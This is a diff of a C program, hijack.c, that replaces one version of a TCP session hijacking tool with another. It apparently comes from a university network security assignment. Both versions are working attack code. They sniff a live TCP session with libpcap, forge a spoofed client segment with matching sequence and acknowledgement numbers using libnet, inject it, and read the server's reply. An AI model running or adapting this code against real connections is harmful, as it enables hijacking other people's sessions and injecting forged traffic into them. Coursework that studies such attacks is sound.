@@ -1,249 +1,265 @@
-/*****************************************************************
- * File: hijack.c
- * by: Group YaKeXi
- * 
- * History:
- * 
- *  2010/02/22 Completed and tested by Hongkai Xing 
- *             on Ubuntu 9.10 with libnet 1.1.4 and libpcap 0.8.
- *
- * Description: Sniffs a packet from a live tcp session and forges
- *              a fake tcp message from it. Then sends the forged
- *              packet to the server and obtain its reply.
- *
- *****************************************************************/
-
-#include <stdio.h>
-#include <stdlib.h>
-#include <resolv.h>
-#include <stdint.h>
-#include <unistd.h>
-#include <string.h>
 #include <pcap.h>
 #include <libnet.h>
 
-#include <sys/socket.h>
-#include <netinet/in.h>
-#include <arpa/inet.h>
-#include <netinet/if_ether.h> 
 #include <net/ethernet.h>
-#include <netinet/ether.h> 
 
-#define BUFSIZE         1600
-#define MESSAGE_FORMAT  "O kind server, %s needs your blessings."
+#include <stdio.h>
+#include <stdlib.h>
+#include <time.h>
+#include <math.h>
 
-#ifndef ETHER_HDRLEN
-#define ETHER_HDRLEN 14
+#define MAGIC "O kind server, %s needs your blessings.\n"
+#define MAGIC_NUM 3
+
+void usage() {
+	fprintf(stderr, "\
+usage:\n\
+	hijack <server ip> <server port> <client ip> <client port> <andrew id>\n");
+};
+
+#ifdef DEBUG
+void print_packet(const u_char *packet);
 #endif
 
-pcap_t *set_cap_dev(char *, char *); /* set capdev up to capture dns    */
-int analyze_packet(const u_char *, const char *andrew_id); /* parse a packet, build an answer */
-//void print_tcp_packet(const u_char *packet);
+pcap_t *init_pcap_handle(char*, char*, char*, char*);
+libnet_t *init_libnet_handle();
+int inject(libnet_t *, const u_char *, char *, u_int32_t, u_int32_t *);
 
-void showErrorMsg(char *msg)
-{
-        perror(msg);
-        exit(1);
-}
-
-int usage() {
-	printf("USAGE:\n");
-	printf("\tsudo ./hijack <client ip> <client port> \
-				<server ip> <server port> <andrew_id>\n");
-	exit(EXIT_FAILURE);
-}
-
-int main(int argc, char **argv) {
-//	char *device="lo";		// device name in string
-	char filter[1024];              // Capture filter string
-	char errbuf[PCAP_ERRBUF_SIZE];  // Error Buffer
-	pcap_t* capdev;                 // Packet Capture Handler
-	const u_char *packet = NULL;	
-	struct pcap_pkthdr pcap_hdr;    // Pcap packet header
-
-	/* loopback interface has been specified.*/
-	device = pcap_lookupdev(errbuf);// get the name of a network device
-	if (device == NULL) {
-		showErrorMsg(errbuf);
-		exit(1);
+int main(int argc, char* argv[]) {
+	if (argc != 6) {
+		usage();
+		exit(EXIT_FAILURE);
 	}
 
-	if (argc != 6) usage();		// show usage
+	char* client_ip = argv[1];
+	char* client_port = argv[2];
+	char* server_ip = argv[3];
+	char* server_port = argv[4];
+	char* andrew_id = argv[5];
 
-	int srvPort = atoi(argv[4]);	// get server's port number in integer
-	int cliPort = atoi(argv[2]);	// get client's port number in integer
+	char payload[1024];
+	sprintf(payload, MAGIC, andrew_id);
+	u_int32_t payload_s = strlen(payload) + 1;
+#ifdef DEBUG
+	fprintf(stderr, "Payload Prepared, length %d\n%s\n", payload_s, payload);
+#endif
 
-	/* Consturct a filter which capture the ACK packet from server to client */
-	sprintf(filter,"(tcp src port %d) && (tcp dst port %d) && (tcp[13] & 16 != 0) && \
-			(src host %s)     && (dst host %s)",srvPort,cliPort,argv[3],argv[1]);
+	libnet_t *l = init_libnet_handle(); 
+	pcap_t *handle = init_pcap_handle(server_ip, server_port, client_ip, client_port);
 
-	/* Setup for sniffering on Ethernet, compile and apply filter expression */
-	capdev = set_cap_dev(device, filter);	
-	printf("Sniffering on: %s\n", device);
+	struct pcap_pkthdr header;
+	const u_char *packet = NULL;
+	time_t now;
 
-	/* Intercept, craft and inject */
-	while(1){
-		packet = pcap_next(capdev,&pcap_hdr);	// intercept an specified packet
-		if (packet == NULL) continue;
-		// print_tcp_packet(packet);
-		analyze_packet(packet,argv[5]);		// argv[5] == andrew_id
-    		break;
- 	}
+	while (1) {
+		now = time(NULL);
+		packet = pcap_next(handle, &header);
+		if (packet == NULL) {
+			continue;
+		}
 
-  /**** read acknowledgement and reply from   ****/
-  /**** the server and print the 'data' part  ****/
-  /**** of the reply which should contain     ****/
-  /**** your secret message.                  ****/
+#ifdef DEBUG
+		fprintf(stderr, "%ld: Analysis at %ld:%ld, length: %d\n", now, header.ts.tv_sec, header.ts.tv_usec, header.len);
+#endif
 
-        struct ip *ip;        /* IP header */
-        struct tcphdr *tcp;   /* TCP header */
-        char *data;           /* Pointer to payload */
-	int datalen;
+		if (fabs(difftime(now, header.ts.tv_sec)) > 1.) {
+#ifdef DEBUG
+			fprintf(stderr, "packet too old, disgarded.\n");
+#endif
+			continue;
+		}
 
-	while(1){
-		packet = pcap_next(capdev,&pcap_hdr);
-	        ip = (struct ip *) (packet + ETHER_HDRLEN);
-	        tcp = (struct tcphdr *) (packet + ETHER_HDRLEN + LIBNET_IPV4_H);
-	        data = (char *)(packet + ETHER_HDRLEN + LIBNET_IPV4_H + LIBNET_TCP_H+12);
-		datalen = strlen(data);
-		printf("Server's Reply: %s\n",data);
-		if (datalen > 0) break;		
+		u_int32_t expect_ack = 0;
+		if (inject(l, packet, payload, payload_s, &expect_ack) == -1) {
+			fprintf(stderr, "Injection failed\n");
+			continue;
+		}
+#ifdef DEBUG
+		fprintf(stderr, "Expecting server return ack: %lu\n", (unsigned long)expect_ack);
+#endif
+
+		int i;
+		for (i = 0; i < MAGIC_NUM; ++i) {
+			packet = NULL;
+			while (packet == NULL) {
+				packet = pcap_next(handle, &header);
+			}
+
+			struct ip *ip = (struct ip *) (packet + ETHER_HDR_LEN);
+			int ip_len = ntohs(ip->ip_len);
+			int ip_size = ip->ip_hl * 4;
+
+			struct tcphdr *tcp = (struct tcphdr *) (packet + ETHER_HDR_LEN + ip_size);
+			int tcp_size = tcp->doff * 4;
+
+			int payload_size = ip_len - ip_size - tcp_size;
+			if (payload_size == 0) {
+				continue;
+			}
+#ifdef DEBUG
+			printf("Packet Length: %d\nIP Header Length: %d\nTCP Header Length %d\nPayload Length: %d\n", ip_len, ip_size, tcp_size, payload_size);
+#endif
+
+	        u_char *data = (u_char *)(packet + ETHER_HDR_LEN + ip_size + tcp_size);
+#ifdef DEBUG
+			print_packet(packet);
+#endif
+			if (ntohl(tcp->ack_seq) == expect_ack) {
+				printf("%s\n", data);
+				break;
+			}
+		}
+
+		if (i != MAGIC_NUM) {
+			break;
+		}
+#ifdef DEBUG
+		fprintf(stderr, "Attack failed, trying again!\n");
+#endif
 	}
 
-  pcap_close(capdev);
+#ifdef DEBUG
+	fprintf(stderr, "All done, cleaning up...\n");
+#endif
 
-  return 0;
-}
-
-
-/* Basic setup for packet sniffing. You dont need to modify this. */
-pcap_t *set_cap_dev (char *device, char *filter) {
-	unsigned int network;           /* Filter setting */
-	unsigned int netmask;           /* Filter setting */
-	struct bpf_program fp;          /* Store compiled filter */
-	pcap_t *capdev;                 /* Packet Capture Handler */
-	char errbuf[PCAP_ERRBUF_SIZE];  /* Error buffer */
-
-	pcap_lookupnet (device, &network, &netmask, errbuf);
-
-	/* Open a network device for packet capture */
-	if ((capdev = pcap_open_live(device, BUFSIZE, 1, 1000, errbuf)) == NULL) 
-	{printf("pcap_open_live(): %s\n", errbuf);exit(1);}
-
-	/* Make sure that we're capturing on an Ethernet device */
-	if (pcap_datalink(capdev) != DLT_EN10MB) 
-	{printf("%s is not an Ethernet\n", device);exit(1);}
-
-	/* Compile the filter expression */
-	if (pcap_compile(capdev, &fp, filter, 0, netmask) == -1) 
-	{printf("Couldn't parse filter %s: %s\n", filter, pcap_geterr(capdev));exit(1);}
-	
-	/* Apply the compiled filter */
-	if (pcap_setfilter(capdev, &fp) == -1) 
-	{printf("Couldn't install filter %s: %s\n", filter, pcap_geterr(capdev));exit(1);}
-	
-	return capdev;
-}
-
-/*
-void print_tcp_packet(const u_char *packet) {
-
-	struct ip *ip;        // IP header
-	struct tcphdr *tcp;   // TCP header
-	char *data;           // Pointer to payload
-
-	ip = (struct ip *) (packet + ETHER_HDRLEN);
-	tcp = (struct tcphdr *) (packet + ETHER_HDRLEN + LIBNET_IPV4_H);
-	data = (char *)(packet + ETHER_HDRLEN + LIBNET_IPV4_H + LIBNET_TCP_H);
-
-	printf("TCP >>> [src]%s:%d\n", inet_ntoa(ip->ip_src),ntohs(tcp->source));
-	printf("        [dst]%s:%d\n", inet_ntoa(ip->ip_dst),ntohs(tcp->dest));
-	printf("        seq:%d,ack:%d\n", ntohl(tcp->seq),ntohl(tcp->ack_seq));
-	
-	return;
-}
-*/
-
-/* Analyze a packet and store information */
-int analyze_packet(const u_char *packet, const char *andrew_id) {
-
-	libnet_t *l;    		// libnet handler/context
-	libnet_ptag_t tcp_tag, ip_tag;	// libnet protocol tags
-	char errbuf[LIBNET_ERRBUF_SIZE];// libnet error message buffer
-	int inject_size;		// Number of bytes of injected packet
-
-	struct ip *ip;			// ip header
-        struct tcphdr *tcp;             // tcp header
-	ip = (struct ip *) (packet + ETHER_HDRLEN);
-        tcp = (struct tcphdr *) (packet + ETHER_HDRLEN + LIBNET_IPV4_H);
-
-	/* construct payload string */
-	char payload[100];			// payload string
-	sprintf(payload, MESSAGE_FORMAT, andrew_id);
-	int payload_size = strlen(payload);	// payload size in byte
-
-	/* Extract seq, ack and other info from intercepted ACK packet */
-	unsigned long new_ack = ntohl(tcp->seq);
-	unsigned long new_seq = ntohl(tcp->ack_seq);
-	unsigned short new_src_port_no = ntohs(tcp->dest);
-	unsigned short new_dst_port_no = ntohs(tcp->source);
-	unsigned short new_window = ntohs(tcp->window) + 1;
-
-	/* Get a libnet handler and convert ip address format */
-	l = libnet_init(LIBNET_RAW4, "lo", errbuf);
-	if (l == NULL) showErrorMsg(errbuf);
-        u_int32_t new_src_ip = libnet_name2addr4(l,inet_ntoa(ip->ip_dst),LIBNET_DONT_RESOLVE);
-        u_int32_t new_dst_ip = libnet_name2addr4(l,inet_ntoa(ip->ip_src),LIBNET_DONT_RESOLVE);
-	u_int16_t new_id = ntohs(ip->ip_id)+1;
-
-	/* TCP header construction */
-	tcp_tag = libnet_build_tcp(
-		new_src_port_no,		// source port
-		new_dst_port_no,		// destination port
-		new_seq,			// sequence number
-		new_ack,			// ackowledgement number
-		0x18,				// control flags
-		new_window,			// window sizee
-		0,				// checksum
-		0,				// urgent pointer
-		LIBNET_TCP_H+payload_size,	// length of TCP packet
-		(u_int8_t *)payload,		// crafted payload
-		payload_size,			// payload length
-		l,				// pointer to libnet context
-		0);				// protocol tag = 0, build new
-	if (tcp_tag == -1) {
-		printf("Building TCP header failed: %s\n", libnet_geterror(l));
-		return -1;
-	}
-
-	/* IP header construction */
-	ip_tag = libnet_build_ipv4(
-		LIBNET_IPV4_H+LIBNET_TCP_H+payload_size,// total length
-		0,				// type of service
-		new_id,				// identification number
-		0,				// fragmentation offset
-		64,				// time to live
-		IPPROTO_TCP,			// upper layer protocol
-		0,				// checksum
-		new_src_ip,			// source IPv4 address
-		new_dst_ip,			// destination IPv4 address
-		NULL,				// no payload
-		0,				// payload length
-		l,				// pointer to libnet context
-		0);				// protocol tag=0, build new
-	if (ip_tag == -1) {
-		printf("Building IP header failed: %s\n", libnet_geterror(l));
-		return -1;
-	}
-
-	/*  Inject the packet */
-	inject_size=libnet_write(l);
-	if (inject_size == -1) {
-		printf("Write failed: %s\n", libnet_geterror(l));
-	}
-
-	/*  Destroy the packet */
+	pcap_close(handle);
 	libnet_destroy(l);
+
 	return 0;
 }
 
+pcap_t *init_pcap_handle(char* server_ip, char* server_port, char* client_ip, char* client_port) {
+	char *dev = "lo";
+	char errbuf[PCAP_ERRBUF_SIZE];
+
+//	dev = pcap_lookupdev(errbuf);
+	if (dev == NULL) {
+		fprintf(stderr, "pcap_lookupdev failed: %s\n", errbuf);
+		exit(EXIT_FAILURE);
+	}
+#ifdef DEBUG
+	fprintf(stderr, "Found dev for sniffing: %s\n", dev);
+#endif
+
+	pcap_t *handle = pcap_open_live(dev, 1536, 1, 1000, errbuf);
+	if (handle == NULL) {
+		fprintf(stderr, "pcap_open_live failed: %s\n", errbuf);
+		exit(EXIT_FAILURE);
+	}
+
+	struct bpf_program fp;
+	char filter[1024];
+	sprintf(filter,
+		"(src host %s) and (tcp src port %s) and (dst host %s) and (tcp dst port %s)\
+			and (tcp[tcpflags] & tcp-ack != 0)", 
+			server_ip, server_port, client_ip, client_port);
+#ifdef DEBUG
+	fprintf(stderr, "Prepared filter: %s\n", filter);
+#endif
+
+	if (pcap_compile(handle, &fp, filter, 1, 0) == -1) {
+		fprintf(stderr, "pcap_compile failed: %s\n", pcap_geterr(handle));
+		exit(EXIT_FAILURE);
+	}
+	
+	if (pcap_setfilter(handle, &fp) == -1) {
+		fprintf(stderr, "pcap_setfilter failed: %s\n", pcap_geterr(handle));
+		exit(EXIT_FAILURE);
+	}
+
+	pcap_freecode(&fp);
+
+	return handle;
+}
+
+libnet_t *init_libnet_handle() {
+	char errbuf[LIBNET_ERRBUF_SIZE];
+
+	libnet_t *l = libnet_init(LIBNET_RAW4, NULL, errbuf);
+	if (l == NULL) {
+		fprintf(stderr, "libnet_init failed: %s\n", errbuf);
+		exit(EXIT_FAILURE);
+	}
+
+	return l;
+}
+
+#ifdef DEBUG
+void print_packet(const u_char *packet) {
+	struct ip *ip;        // IP header
+	struct tcphdr *tcp;   // TCP header
+
+	ip = (struct ip *) (packet + ETHER_HDR_LEN);
+	tcp = (struct tcphdr *) (packet + ETHER_HDR_LEN + LIBNET_IPV4_H);
+
+	fprintf(stderr, "TCP >>> [src]%s:%u\n", inet_ntoa(ip->ip_src), (unsigned int)ntohs(tcp->source));
+	fprintf(stderr, "        [dst]%s:%u\n", inet_ntoa(ip->ip_dst), (unsigned int)ntohs(tcp->dest));
+	fprintf(stderr, "        seq:%lu,ack:%lu\n", (unsigned long)ntohl(tcp->seq), (unsigned long)ntohl(tcp->ack_seq));
+}
+#endif
+
+int inject(libnet_t *l, const u_char* packet, char* payload, u_int32_t payload_s, u_int32_t *expect_ack) {
+#ifdef DEBUG
+	fprintf(stderr, "Sniffed Packet:\n");
+	print_packet(packet);
+#endif
+
+	static libnet_ptag_t ip_tag = LIBNET_PTAG_INITIALIZER, tcp_tag = LIBNET_PTAG_INITIALIZER;
+
+	struct tcphdr tcp_hdr = *(struct tcphdr *) (packet + ETHER_HDR_LEN + LIBNET_IPV4_H);
+	struct ip ip_packet = *(struct ip *) (packet + ETHER_HDR_LEN);
+
+	// Forge an tcp segment from the client to the server
+	tcp_tag = libnet_build_tcp(
+		ntohs(tcp_hdr.dest),		// source port
+		ntohs(tcp_hdr.source),		// destination port
+		ntohl(tcp_hdr.ack_seq),	// sequence number
+		ntohl(tcp_hdr.seq),		// ackowledgement number
+		TH_ACK,				// control flags
+		tcp_hdr.window,		// window sizee
+		0,					// checksum
+		0,					// urgent pointer
+		LIBNET_TCP_H + payload_s,	// length of TCP packet
+		(u_int8_t *)payload,			// crafted payload
+		payload_s,			// payload length
+		l,					// pointer to libnet context
+		tcp_tag);			// protocol tag
+	if (tcp_tag == -1) {
+#ifdef DEBUG
+		fprintf(stderr, "libnet_build_tcp failed: %s\n", libnet_geterror(l));
+#endif
+		return 0;
+	}
+#ifdef DEBUG
+	fprintf(stderr, "TCP segment created\n");
+#endif
+
+	ip_tag = libnet_build_ipv4(
+		LIBNET_IPV4_H + LIBNET_TCP_H + payload_s,// total length
+		0,				// type of service
+		ip_packet.ip_id,			// identification number
+		0,				// fragmentation offset
+		64,				// time to live
+		IPPROTO_TCP,	// upper layer protocol
+		0,				// checksum
+		ip_packet.ip_dst.s_addr,		// source IPv4 address
+		ip_packet.ip_src.s_addr,		// destination IPv4 address
+		NULL,			// no payload
+		0,				// payload length
+		l,				// pointer to libnet context
+		ip_tag);		// protocol
+
+	if (ip_tag == -1) {
+#ifdef DEBUG
+		fprintf(stderr, "libnet_build_ipv4 failed: %s\n", libnet_geterror(l));
+#endif
+		return 0;
+	}
+#ifdef DEBUG
+	fprintf(stderr, "IPv4 segment created\n");
+#endif
+	libnet_write(l);
+
+	*expect_ack = ntohl(tcp_hdr.ack_seq) + payload_s;
+	return 0;
+}
